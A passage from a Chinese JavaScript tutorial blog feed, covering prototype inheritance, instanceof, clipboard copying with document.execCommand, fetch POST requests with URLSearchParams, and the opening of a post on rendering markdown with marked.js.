bar<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> <span class="token class-name">Bar</span><span class="token punctuation">.</span>prototype<span class="token punctuation">;</span> <span class="token comment">// true</span>
Bar<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> Foo<span class="token punctuation">;</span> <span class="token comment">// true</span>
<span class="token class-name">Bar</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> <span class="token class-name">Foo</span><span class="token punctuation">.</span>prototype<span class="token punctuation">;</span> <span class="token comment">// true</span>

<span class="token comment">// 子类的继承实现大致如下，故会出现与一般情况不同的__proto__指向</span>
Object<span class="token punctuation">.</span><span class="token function">setPrototypeOf</span><span class="token punctuation">(</span><span class="token class-name">Bar</span><span class="token punctuation">.</span>prototype<span class="token punctuation">,</span> <span class="token class-name">Foo</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
Object<span class="token punctuation">.</span><span class="token function">setPrototypeOf</span><span class="token punctuation">(</span>Bar<span class="token punctuation">,</span> Foo<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>class 在 ES6 中才出现，那么在 ES6 以前，如何实现父类与子类的继承关系呢？</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// 这是父类</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">Bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// 这是子类</span>
  <span class="token function">Foo</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 继承第一步，用Bar的this与参数调用Foo</span>
<span class="token punctuation">&#125;</span>
<span class="token class-name">Bar</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 继承第二步，改写Bar的原型，建立与Foo的原型链关系</span>
<span class="token comment">// 也可以写成 Bar.prototype = Object.create(Foo.prototype);</span>

<span class="token comment">// 由于Bar.prototype被赋值语句改写，因此原本的构造函数constructor与Bar.prototype的关系被切断了，</span>
<span class="token comment">// Bar.prototype.constructor绑定到了Foo上，</span>
<span class="token comment">// 需要再次绑定回Bar构造函数</span>
<span class="token class-name">Bar</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> Bar<span class="token punctuation">;</span> <span class="token comment">// 继承第三步，绑定丢失的构造函数</span>

<span class="token keyword">const</span> bar <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
bar<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> <span class="token class-name">Bar</span><span class="token punctuation">.</span>prototype<span class="token punctuation">;</span> <span class="token comment">// true</span>
Bar<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> <span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">;</span> <span class="token comment">// true</span>
<span class="token class-name">Bar</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> <span class="token class-name">Foo</span><span class="token punctuation">.</span>prototype<span class="token punctuation">;</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们可以看出，ES5 与 ES6 在类的继承上几乎是相同的。除了语法糖造成的写法上的不同外，就是 Bar.__proto__属性指向不同。ES6 中 Bar.__proto__指向父类的构造函数。ES5 中则是指向原生函数的原型对象。</p>
<h2 id="附加内容"><a href="#附加内容" class="headerlink" title="附加内容"></a>附加内容</h2><h3 id="instanceof-的实现机制"><a href="#instanceof-的实现机制" class="headerlink" title="instanceof 的实现机制"></a>instanceof 的实现机制</h3><p>instanceof 左值一般是对象，右值是构造函数。实现原理大致如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">L</span> <span class="token keyword">instanceof</span> <span class="token class-name">R</span>
<span class="token constant">L</span><span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>__proto__<span class="token operator">...</span> <span class="token operator">===</span> <span class="token class-name">R</span><span class="token punctuation">.</span>prototype <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token operator">:</span> <span class="token boolean">false</span>
<span class="token comment">// 最终返回值是布尔值</span>
<span class="token comment">// 结合文章开始的图，就会明白为什么下面的结果都是true了</span>
Function <span class="token keyword">instanceof</span> <span class="token class-name">Object</span><span class="token punctuation">;</span> <span class="token comment">// true</span>
Object <span class="token keyword">instanceof</span> <span class="token class-name">Function</span><span class="token punctuation">;</span> <span class="token comment">// true</span>
Function <span class="token keyword">instanceof</span> <span class="token class-name">Function</span><span class="token punctuation">;</span> <span class="token comment">//true</span>
Object <span class="token keyword">instanceof</span> <span class="token class-name">Object</span><span class="token punctuation">;</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="实例的-constructor"><a href="#实例的-constructor" class="headerlink" title="实例的 constructor"></a>实例的 constructor</h3><p>尽管最终的实例对象并没有 constructor 属性，但仍然可以调用，这是为什么呢？其实只是通过原型链调用了原型上的 constructor 属性，并不是实例对象有 constructor 属性。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token keyword">const</span> foo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
foo<span class="token punctuation">.</span>constructor <span class="token operator">===</span> Foo<span class="token punctuation">;</span> <span class="token comment">// true</span>
foo<span class="token punctuation">.</span>constructor <span class="token operator">===</span> <span class="token class-name">Foo</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor<span class="token punctuation">;</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>参考链接<br><a href="https://www.zhihu.com/question/34183746">https://www.zhihu.com/question/34183746</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain</a><br><a href="https://github.com/mqyqingfeng/Blog/issues/2">https://github.com/mqyqingfeng/Blog/issues/2</a></p>
</blockquote>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>javascript复制到剪贴板</title>
    <url>/2019/08/05/javascript%E5%A4%8D%E5%88%B6%E5%88%B0%E5%89%AA%E8%B4%B4%E6%9D%BF/</url>
    <content><![CDATA[<h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><ol>
<li>第三方库：clipboard.js</li>
<li>原生api：Clipboard API（还处于草案阶段，兼容性差）</li>
<li>document.execCommand()</li>
</ol>
<p>若是项目中需要经常操作剪贴板，推荐使用第三方库，若仅是轻量使用，推荐document.exeCommand()方法。待原生api稳定后，使用原生api是更为优雅的方式。</p>
<p>这里我们着重讲document.execCommand()方法</p>
<h2 id="document-execCommand"><a href="#document-execCommand" class="headerlink" title="document.execCommand()"></a>document.execCommand()</h2><p>首先需要注意的是document.execCommand()方法只能操作可编辑区域的内容，如input、textarea等，像div这类无法聚焦的元素原则上是无法使用document.execCommand()方法的，在div上增加tabIndex属性，让div变成一个可聚焦可编辑元素，这里仅提供一个思路，不做详细展开。</p>
<p>我们使用textarea做为可编辑区域，在文档对象中新建一个textarea元素，然后挂载到文档末尾，再将要获取的文本赋值给textarea，最后通过document.execCommand()方法获取textarea中选中的值并删除这个textarea元素。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> textarea <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"textarea"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>textarea<span class="token punctuation">)</span><span class="token punctuation">;</span>
textarea<span class="token punctuation">.</span>value  <span class="token operator">=</span> <span class="token string">"test string"</span><span class="token punctuation">;</span>
textarea<span class="token punctuation">.</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span><span class="token function">execCommand</span><span class="token punctuation">(</span><span class="token string">"copy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>textarea<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>参考链接 <a href="https://juejin.im/post/5a94f8eff265da4e9b593c29">JavaScript复制内容到剪贴板</a></p>
</blockquote>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>剪贴板</tag>
        <tag>clipboard</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript在fetch中使用POST方法传输x-www-form-urlencoded格式数据</title>
    <url>/2021/05/06/javascript%E5%9C%A8fetch%E4%B8%AD%E4%BD%BF%E7%94%A8POST%E6%96%B9%E6%B3%95%E4%BC%A0%E8%BE%93x-www-form-urlencoded%E6%A0%BC%E5%BC%8F%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<h2 id="使用-fetch"><a href="#使用-fetch" class="headerlink" title="使用 fetch"></a>使用 fetch</h2><p>fetch 与 XMLHttpRequest 实现的 jQuery.ajax() 有以下三点不同：</p>
<ul>
<li>当接收到一个代表错误的 HTTP 状态码时（即使响应的 HTTP 状态码是 404 或 500），从 fetch 返回的 Promise 不会被标记为 reject。它会将 Promise 状态标记为 resolve（但是会将 resolve 返回值的 ok 属性设置为 false），仅当网络故障时或请求被阻止时，才会标记为 reject；</li>
<li>fetch 可以接受跨域 cookies；</li>
<li>fetch 默认不发送 cookies，除非你使用了 credentials 选项；</li>
</ul>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"http:// example.com/movies.json"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">response</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><code>fetch()</code> 获取到的只是一个 HTTP 响应，而不是真正的 JSON，为了获取真正的 JSON 内容，需要使用 <code>json()</code> 方法。</p>
<span id="more"></span>

<h3 id="fetch-语法与支持的请求参数"><a href="#fetch-语法与支持的请求参数" class="headerlink" title="fetch 语法与支持的请求参数"></a>fetch 语法与支持的请求参数</h3><p><code>Promise&lt;Response&gt; fetch(input[, init]);</code></p>
<h4 id="input-定义了要获取的资源"><a href="#input-定义了要获取的资源" class="headerlink" title="input 定义了要获取的资源"></a>input 定义了要获取的资源</h4><ul>
<li>可以是一个<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/USVString">USVString</a>字符串，包含要获取资源的 URL；</li>
<li>也可以是一个 Request 对象</li>
</ul>
<h4 id="init-可选，一个配置对象，包括所有对请求的设置"><a href="#init-可选，一个配置对象，包括所有对请求的设置" class="headerlink" title="init 可选，一个配置对象，包括所有对请求的设置"></a>init 可选，一个配置对象，包括所有对请求的设置</h4><ul>
<li>method: 请求使用的方法，如 GET、POST；</li>
<li>headers: 请求的头信息，形式为<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Headers">Headers</a>的对象或包含<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/ByteString">ByteString</a>值的对象字面量；</li>
<li>body: 请求的 body 信息，可能是<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Blob">Blob</a>、<a href="https://developer.mozilla.org/en-US/docs/Web/API/BufferSource">BufferSource</a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/FormData">FormData</a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/URLSearchParams">URLSearchParams</a>或<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/USVString">USVString</a>对象。注意 GET 或 HEAD 方法的请求不能包含 body 信息；</li>
<li>mode: 请求的模式，如 cors、no-cors 或 same-origin；</li>
<li>credentials: 自动发送 cookie 的选项，不提供不自动发送，可选值为 omit（不发送）、smae-origin（仅同源时发送）、include（不论同源或跨域，均发送）；</li>
<li>cache：请求的缓存模式，可选值为 default、no-store、reload、no-cache、force-cache、only-if-cached；</li>
<li>redirect: 重定向模式，可选值为 follow（自动重定向）、error（如果产生重定向将自动终止并且抛出一个错误）、manual（手动处理重定向），Chrome 中默认为 follow；</li>
<li>referrer: 引荐来源，该字段告诉服务器，用户在访问当前资源之前的位置，可用来引流分析与用户跟踪，可选值为 client、no-referrer、或 URL，默认为 client；</li>
<li>referrerPolicy: 指定了 HTTP 头部 referer（拼写无误，是 HTTP 标准建立时，就拼写错误，承袭至今），可选值为 no-referrer、no-referrer-when-downgrade、origin、origin-when-cross-origin、unsafe-url；</li>
<li>integrity: 包括请求的<a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity">subresource integrity</a>值（ 例如： sha256-BpfBw7ivV8q2jLiT13fxDYAe2tJllusRSZ273h2nFSE=）；</li>
</ul>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"http://example.com/answer"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
  body<span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> answer<span class="token operator">:</span> <span class="token number">42</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// must match 'Content-Type' header</span>
  cache<span class="token operator">:</span> <span class="token string">"no-cache"</span><span class="token punctuation">,</span> <span class="token comment">// *default, no-cache, reload, force-cache, only-if-cached</span>
  credentials<span class="token operator">:</span> <span class="token string">"same-origin"</span><span class="token punctuation">,</span> <span class="token comment">// include, same-origin, *omit</span>
  headers<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"user-agent"</span><span class="token operator">:</span> <span class="token string">"Mozilla/4.0 MDN Example"</span><span class="token punctuation">,</span>
    <span class="token string">"content-type"</span><span class="token operator">:</span> <span class="token string">"application/json"</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  method<span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token comment">// *GET, POST, PUT, DELETE, etc.</span>
  mode<span class="token operator">:</span> <span class="token string">"cors"</span><span class="token punctuation">,</span> <span class="token comment">// no-cors, cors, *same-origin</span>
  redirect<span class="token operator">:</span> <span class="token string">"follow"</span><span class="token punctuation">,</span> <span class="token comment">// manual, *follow, error</span>
  referrer<span class="token operator">:</span> <span class="token string">"no-referrer"</span><span class="token punctuation">,</span> <span class="token comment">// *client, no-referrer</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">response</span><span class="token punctuation">)</span> <span class="token operator">=></span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Response-对象"><a href="#Response-对象" class="headerlink" title="Response 对象"></a>Response 对象</h3><p>Response 实例是在 fetch 处理完 promise 之后返回的。常见的 response 属性有</p>
<ul>
<li>Response.status 响应状态码，默认值为 200；</li>
<li>Response.statusText 响应状态文本（默认为”OK”），与状态码相对应；</li>
<li>Response.ok 该属性用来检查 response 的状态是否在 200-299 这个范围内，该属性值类型为布尔值；</li>
</ul>
<h3 id="Body"><a href="#Body" class="headerlink" title="Body"></a>Body</h3><p>不论请求或响应都能够包含 body 对象。body 也可以是以下任意类型的实例。</p>
<ul>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer">ArrayBuffer</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypedArray">ArrayBufferView</a>（Unit8Array 等）</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Blob">Blob</a>/File</li>
<li>string</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/URLSearchParams">URLSearchParams</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/FormData">FormData</a></li>
</ul>
<p>Body 类定义了以下方法（这些方法都被 Request 和 Response 对象所实现）以获取 body 内容。这些方法都会返回一个被解析后的 Promise 对象和数据。</p>
<ul>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Body/arrayBuffer">arrayBuffer()</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Body/blob">blob()</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Body/json">json()</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Body/text">text()</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Body/formData">formData()</a></li>
</ul>
<p>相比 XHR，这些方法让非文本化的数据使用起来更加简单，请求体可以由传入 body 参数来进行设置：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> form <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"example-form"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"/example"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
  method<span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>
  body<span class="token operator">:</span> form<span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="fetch-中使用-POST-方法传输-x-www-form-urlencoded-格式数据"><a href="#fetch-中使用-POST-方法传输-x-www-form-urlencoded-格式数据" class="headerlink" title="fetch 中使用 POST 方法传输 x-www-form-urlencoded 格式数据"></a>fetch 中使用 POST 方法传输 x-www-form-urlencoded 格式数据</h2><p>x-www-form-urlencoded 格式即经常用在 GET 请求路径中跟在?后面的查询字符串 queryString，当我们需要在 post 请求中使用这种格式时（放在 body 中），需要用到 URLSearchParams 类，或通过 npm 安装 qs 库来使用。</p>
<h3 id="URLSearchParams"><a href="#URLSearchParams" class="headerlink" title="URLSearchParams"></a>URLSearchParams</h3><p>该接口定义了一些实用的方法来处理 URL 的查询字符串。一个 URLSearchParams 实例对象可以直接用在 for…of 结构中，如下面两行代码是相等的：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token punctuation">[</span>key<span class="token punctuation">,</span> value<span class="token punctuation">]</span> <span class="token keyword">of</span> mySearchParams<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token punctuation">[</span>key<span class="token punctuation">,</span> value<span class="token punctuation">]</span> <span class="token keyword">of</span> mySearchParams<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h4><p>URLSearchParams(init)，init 可不传，后续使用 append 方法新增；init 也可传入一个 queryString 或 二维数组键值对 或 对象，返回值为 URLSearchParams 实例。</p>
<p>注意：<strong>URLSearchParams 构造函数不会解析完整 URL，但是如果字符串起始位置有 ? 的话会被去除</strong></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> mySearchParams <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> mySearchParams1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token string">"?foo=1&amp;bar=2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> mySearchParams2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
  <span class="token punctuation">[</span><span class="token string">"foo"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token punctuation">[</span><span class="token string">"bar"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> mySearchParams3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> foo<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> bar<span class="token operator">:</span> <span class="token number">2</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><ul>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/URLSearchParams/append">URLSearchParams.append()</a> 插入一个指定的键/值对作为新的搜索参数</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/URLSearchParams/delete">URLSearchParams.delete()</a> 从搜索参数列表里删除指定的搜索参数及其对应的值</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/URLSearchParams/entries">URLSearchParams.entries()</a> 返回一个 iterator 可以遍历所有键/值对的对象</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/URLSearchParams/get">URLSearchParams.get()</a> 获取指定搜索参数的第一个值</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/URLSearchParams/getAll">URLSearchParams.getAll()</a> 获取指定搜索参数的所有值，返回是一个数组</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/URLSearchParams/has">URLSearchParams.has()</a> 返回 Boolean 判断是否存在此搜索参数</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/URLSearchParams/keys">URLSearchParams.keys()</a> 返回 iterator 此对象包含了键/值对的所有键名</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/URLSearchParams/set">URLSearchParams.set()</a> 设置一个搜索参数的新值，假如原来有多个值将删除其他所有的值</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/URLSearchParams/sort">URLSearchParams.sort()</a> 按键名排序</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/URLSearchParams/toString">URLSearchParams.toString()</a> 返回搜索参数组成的字符串，可直接使用在 URL 上</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/URLSearchParams/values">URLSearchParams.values()</a> 返回 iterator 此对象包含了键/值对的所有值</li>
</ul>
<h3 id="请求示例"><a href="#请求示例" class="headerlink" title="请求示例"></a>请求示例</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 使用URLSearchParams</span>
<span class="token keyword">const</span> fetchBody <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> time<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span> time<span class="token operator">:</span> <span class="token string">"2020-12-12 08:00:00"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 使用qs库</span>
<span class="token keyword">import</span> qs <span class="token keyword">from</span> <span class="token string">"qs"</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> fetchBody <span class="token operator">=</span> qs<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> time<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span> time<span class="token operator">:</span> <span class="token string">"2020-12-12 08:00:00"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://example.com/post</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
  method<span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>
  <span class="token comment">// 注意body使用URLSearchParams需要在头部注明Content-Type，编码方式使用UTF-8，可以防止乱码的情况</span>
  headers<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"Content-Type"</span><span class="token operator">:</span> <span class="token string">"application/x-www-form-urlencoded;charset=UTF-8"</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  body<span class="token operator">:</span> fetchBody<span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>fetch</tag>
        <tag>x-www-form-urlencoded</tag>
        <tag>URLSearchParams</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript在页面中加载markdown文件</title>
    <url>/2019/07/01/javascript%E5%9C%A8%E9%A1%B5%E9%9D%A2%E4%B8%AD%E5%8A%A0%E8%BD%BDmarkdown%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h2 id="依赖库及其安装"><a href="#依赖库及其安装" class="headerlink" title="依赖库及其安装"></a>依赖库及其安装</h2><p>Marked.js 将markdown语法的字符串解析成为html的库</p>
<p>raw-loader webpack插件，将.md文件做为文本引入</p>
<p>highlight.js 使页面上代码实现高亮的库</p>
<p>安装Marked.js与highlight.js依赖，将raw-loader安装为开发环境依赖</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">npm</span> <span class="token function">install</span> marked highlight.js
<span class="token function">npm</span> <span class="token function">install</span> --save-dev raw-loader<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<span id="more"></span>

<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>该文档基于vue-cli3生成的项目，故webpack配置项放在vue.config.js中</p>
<h3 id="1-配置raw-loader"><a href="#1-配置raw-loader" class="headerlink" title="1. 配置raw-loader"></a>1. 配置raw-loader</h3><p>在项目根目录新建vue.config.js，并做如下配置</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
